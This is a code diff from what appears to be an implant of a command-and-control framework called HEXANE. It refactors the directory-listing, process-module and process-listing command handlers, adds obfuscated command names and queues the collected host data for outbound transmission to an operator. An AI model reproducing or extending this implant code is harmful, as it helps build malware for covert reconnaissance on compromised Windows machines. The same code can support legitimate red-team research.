@@ -5,18 +5,19 @@ namespace Commands {
     VOID DirectoryList (_parser *const parser) {
         HEXANE
 
-        _stream *out    = Stream::CreateStreamWithHeaders(TypeResponse);
-        LPSTR query     = { };
-        LPSTR path      = { };
-        ULONG length    = { };
+        _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
+        Stream::PackString(out, OBF("DirectoryList"));
 
-        HANDLE file             = { };
-        WIN32_FIND_DATAA head   = { };
+        ULONG length = { };
+        LPSTR query = { };
+        LPSTR path = { };
+
+        WIN32_FIND_DATAA head = { };
         ULARGE_INTEGER file_size = { };
-        SYSTEMTIME access_time   = { };
-        SYSTEMTIME sys_time      = { };
+        SYSTEMTIME access_time = { };
+        SYSTEMTIME sys_time = { };
+        HANDLE file = { };
 
-        Stream::PackDword(out, CommandDir);
 
         query = Parser::UnpackString(parser, nullptr);
         path = R_CAST(char*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH));
@@ -73,10 +74,12 @@ namespace Commands {
         if (path) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, path); }
     }
 
-    VOID processModules (_parser *const parser) {
+    VOID ProcessModules (_parser *const parser) {
         HEXANE
 
-        _stream *out                    = Stream::CreateStreamWithHeaders(TypeResponse);
+        _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
+        Stream::PackString(out, OBF("ProcessModules"));
+
         PPEB_LDR_DATA loads             = { };
         PROCESS_BASIC_INFORMATION pbi   = { };
         HANDLE process                  = { };
@@ -92,7 +95,6 @@ namespace Commands {
         INT count = 0;
         SIZE_T size = 0;
 
-        Stream::PackDword(out, CommandMods);
 
         if (
             !(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr))) ||
@@ -139,7 +141,8 @@ namespace Commands {
     VOID ProcessList(_parser *const parser) {
         HEXANE
 
-        _stream *stream             = Stream::CreateStreamWithHeaders(TypeResponse);
+        _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
+        Stream::PackString(out, OBF("ProcessList"));
 
         PROCESSENTRY32 entries      = { };
         HANDLE snapshot             = { };
@@ -185,9 +188,9 @@ namespace Commands {
                             isManaged = TRUE;
 
                             if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
-                                Stream::PackDword(stream, entries.th32ProcessID);
-                                Stream::PackString(stream, entries.szExeFile);
-                                Stream::PackWString(stream, buffer);
+                                Stream::PackDword(out, entries.th32ProcessID);
+                                Stream::PackString(out, entries.szExeFile);
+                                Stream::PackWString(out, buffer);
                             }
                         }
                         runtime->lpVtbl->Release(runtime);
@@ -196,8 +199,8 @@ namespace Commands {
             }
 
             if (!isManaged && Type == UNMANAGED_PROCESS) {
-                Stream::PackDword(stream, entries.th32ProcessID);
-                Stream::PackString(stream, entries.szExeFile);
+                Stream::PackDword(out, entries.th32ProcessID);
+                Stream::PackString(out, entries.szExeFile);
             }
 
             if (meta)       { meta->lpVtbl->Release(meta); }
@@ -205,9 +208,12 @@ namespace Commands {
             if (enums)      { enums->Release(); }
 
             Ctx->Nt.NtClose(process);
-
         } while (Ctx->win32.Process32Next(snapshot, &entries));
-        if (snapshot) { Ctx->Nt.NtClose(snapshot); }
+
+        Dispatcher::OutboundQueue(out);
+        if (snapshot) {
+            Ctx->Nt.NtClose(snapshot);
+        }
     }
 
     VOID Shutdown (_parser *const parser) {
